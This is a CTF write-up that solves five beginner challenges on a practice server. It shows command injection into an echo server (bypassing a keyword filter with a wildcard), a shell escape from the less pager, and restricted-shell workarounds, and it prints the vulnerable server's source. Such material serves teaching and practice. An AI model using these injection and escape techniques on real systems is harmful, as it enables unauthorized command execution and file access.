# Miscellaneous challenges

## Catalias
```
60 points
Hmmm… maybe missing a hyphen somewhere?

Note: This challenge is reset every five minutes. If you are on the wrong side of the clock, you may need to reconnect.

Connect with:
ssh user@jh2i.com -p 50004 # password is 'userpass'
```

### Solution
Connect to the server and execure `ls` command
```
> ssh user@jh2i.com -p 50004 -q ls
flag.txt
```
Nice, now we should read the flag!
```
> ssh user@jh2i.com -p 50004 -q cat flag.txt
user@jh2i.com's password: 
LLS{you_let_the_cat_out_of_the_bag}
```

## Hidden
```
60 points
What secret is this server hiding?!

Connect with:
ssh user@jh2i.com -p 50015 # password is 'userpass'
```

### Solution

Let's start with the server directories listing
```
> ssh user@jh2i.com -p 50015 -q ls -la
user@jh2i.com's password: 
total 24
dr-xr-xr-x 1 user user 4096 Oct 28 19:13 .
drwxr-xr-x 1 root root 4096 Oct 28 19:13 ..
-rw-r--r-- 1 user user  220 Apr  4  2018 .bash_logout
-rw-r--r-- 1 user user 3771 Apr  4  2018 .bashrc
-rw-r--r-- 1 user user  807 Apr  4  2018 .profile
drwxr-xr-x 1 root root 4096 Mar 30 00:12 .secret
```
We should definitely inspect `.secret` directory, it might hold smth interesting!
```
> ssh user@jh2i.com -p 50015
user@jh2i.com's password: 
Last login: Sat Apr  4 13:04:12 2020 from 167.172.141.127
> user@3b02bd78ea5e:~$ cd .secret/
-rbash: cd: restricted
> user@3b02bd78ea5e:~$ ls -la .secret/
total 12
drwxr-xr-x 1 root root 4096 Mar 30 00:12 .
dr-xr-xr-x 1 user user 4096 Oct 28 19:13 ..
-rw-r--r-- 1 root root   33 Mar 30 00:12 ._dont_delete_me.txt
> user@3b02bd78ea5e:~$ cat .secret/._dont_delete_me.txt 
LLS{you_found_my_hidden_secrets}
```
We got it!

## Chasm
```
60 points
The Internet’s new echo server. Break it.

Connect with:
nc jh2i.com 50006
```

### Solution
Connect to the server to see we can do with it
```
nc jh2i.com 50006
'Chasm' echo server 1.0
```
Let's use echo to get the flag 
```
> echo $(ls)        
ECHO: echo flag.txt server.py
> echo $(cat flag.txt)
HACKER! YOU ARE A HACKER! GET OUT OF THE CHASM!
> 
echo $(cat server.py)
ECHO: echo #!/usr/bin/env python # -*- coding: utf-8 -*- # @Author: john # @Date: 2017-01-16 10:17:31 # @Last Modified by: john # @Last Modified time: 2017-02-10 22:17:34 import sys import textwrap import SocketServer import string import readline import threading from time import flag.txt server.py from subprocess import check_output debug = True if debug: def success(string): print("[+] " + string) def error(string): sys.stderr.write("[-] " + string + "
") def warning(string): print("[!] " + string + "
") def info(string): print("[.] " + string + "
") class Service(SocketServer.BaseRequestHandler): def handle(self): self.send("'Chasm' echo server 1.0") while 1: try: got = self.receive() if "flag" in got: self.send("HACKER! YOU ARE A HACKER! GET OUT OF THE CHASM!") continue response = check_output("echo " + got, shell=True) self.send("ECHO: " + response) except: self.send("ERROR! That echo floated away the chasm for eternity...") def send(self, string, newline=True): if newline: string = string + "
" self.request.sendall(string) def receive(self, prompt="> "): self.send(prompt, newline=False) return self.request.recv(4096).strip() class ThreadedService( SocketServer.ThreadingMixIn, SocketServer.TCPServer, SocketServer.DatagramRequestHandler, ): pass def main(): info("Starting server...") port = 7312 host = "0.0.0.0" service = Service server = ThreadedService((host, port), service) server.allow_reuse_address = True server_thread = threading.Thread(target=server.serve_forever) server_thread.daemon = True server_thread.start() success("Server started on " + str(server.server_address) + "!") # Now let the main thread just wait... while True: sleep(10) if __name__ == "__main__": main()

As you can see from the file, we will receive self.send("HACKER! YOU ARE A HACKER! GET OUT OF THE CHASM!") if there is a word "flag" in our command. Let's bypass it:
```
We cannot open the `flag.txt` using `echo $(cat flag.txt)` because the server throws an `HACKER! YOU ARE A HACKER! GET OUT OF THE CHASM!` exception.
What if we slightly modify our command???
```
> echo $(cat fl*)
ECHO: echo LLS{dangerous_echos_in_this_chasm}
```

# Linux Kiosk
```
70 points
This public computer kiosk is weird! It just offers the man page for less?

Connect here:
ssh user@jh2i.com -p 50021 # password is 'userpass'
```

### Solution
Let's connect to the server using `ssh`
```
ssh user@jh2i.com -p 50021
user@jh2i.com's password: 
LESS(1)                                    General Commands Manual                                   LESS(1)

NAME
       less - opposite of more

SYNOPSIS
       less -?
       less --help
       less -V
       less --version
       less [-[+]aABcCdeEfFgGiIJKLmMnNqQrRsSuUVwWX~]
            [-b space] [-h lines] [-j line] [-k keyfile]
            [-{oO} logfile] [-p pattern] [-P prompt] [-t tag]
            [-T tagsfile] [-x tab,...] [-y lines] [-[z] lines]
            [-# shift] [+[+]cmd] [--] [filename]...
       (See the OPTIONS section for alternate option syntax with long option names.)

DESCRIPTION
       Less is a program similar to more (1), but it has many more features.  Less does not have to read the
       entire input file before starting, so with large input files it starts up faster  than  text  editors
       like  vi  (1).  Less uses termcap (or terminfo on some systems), so it can run on a variety of termi‐
       nals.  There is even limited support for hardcopy terminals.  (On a hardcopy  terminal,  lines  which
       should be printed at the top of the screen are prefixed with a caret.)

       Commands  are  based  on both more and vi.  Commands may be preceded by a decimal number, called N in
       the descriptions below.  The number is used by some commands, as indicated.

```
After login, the server displays a manual for the `less` command. If we press `q`, connection to the server will be closed 
Login once again and type `!echo 123`
```
> !echo 123
Last login: Sat Apr  4 17:46:35 2020 from 167.172.141.127
man: can't set the locale; make sure $LC_* and $LANG are correct
123
!done  (press RETURN)
```
Voilla!! We can execute commands!!! Let's try !cat flag.txt
```
> ssh user@jh2i.com -p 50021
Last login: Sat Apr  4 17:46:35 2020 from 167.172.141.127
man: can't set the locale; make sure $LC_* and $LANG are correct
123
!done  (press RETURN)
LLS{less_is_more}
!done  (press RETURN)
```

Here we are!!!

## MissingCho
```
80 points
I keep trying to run this program, but I get "Permission Denied." What gives!??

Connect with:
ssh user@jh2i.com -p 50025 # password is 'userpass'
```
### Solution
Connect to the server using `ssh`
```
> ssh -v user@jh2i.com -p 50025
Last login: Sat Apr  4 17:55:19 2020 from 167.172.141.127
user@68cc7c8f1469:~$ ls 
give_flag
user@68cc7c8f1469:~$ cat give_flag 
-bash: cat: command not found
user@68cc7c8f1469:~$ ls -la give_flag 
-r--r--r-- 1 root root 8232 Mar 30 00:12 give_flag
user@68cc7c8f1469:~$ chmod +x give_flag 
-bash: chmod: command not found
user@68cc7c8f1469:~$ tail give_flag
...
LLS{who_even_needs_chmod}
...
```
Awesome!
